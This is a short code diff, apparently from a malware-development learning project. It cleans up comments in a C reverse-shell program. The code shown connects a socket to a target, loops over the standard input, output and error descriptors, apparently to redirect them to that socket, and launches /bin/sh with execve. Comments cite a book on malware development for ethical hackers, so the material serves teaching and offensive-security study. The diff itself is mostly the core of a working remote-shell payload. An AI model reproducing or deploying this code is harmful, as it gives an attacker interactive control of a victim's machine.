@@ -47,14 +47,11 @@ if (connect(sock,(struct sockaddr *)&target_address, sizeof(target_address)) < 0
     exit(EXIT_FAILURE);
 }
 
-
-// https://www.baeldung.com/linux/c-dup2-redirect-stdout
-
-// https://github.com/PacktPublishing/Malware-Development-for-Ethical-Hackers/blob/main/chapter01/02-reverse-shell-linux/hack2.c
-
-
+/* Redirecting STDIN,STDOUT,STDERR:
+    * https://www.baeldung.com/linux/c-dup2-redirect-stdout
+    * https://github.com/PacktPublishing/Malware-Development-for-Ethical-Hackers/blob/main/chapter01/02-reverse-shell-linux/hack2.c
+*/
 for (int i =0; i < 3; i++) {
-
     /*
     FDs:
     standard input (STDIN): 0 (zero)
@@ -68,15 +65,7 @@ for (int i =0; i < 3; i++) {
 char * const argv[] = {"/bin/sh",NULL};
 execve("/bin/sh",argv,NULL);
 
-//close(sock);
 return 0;
-
-
-
-
-
-// get response from server.
-
 
 }
 
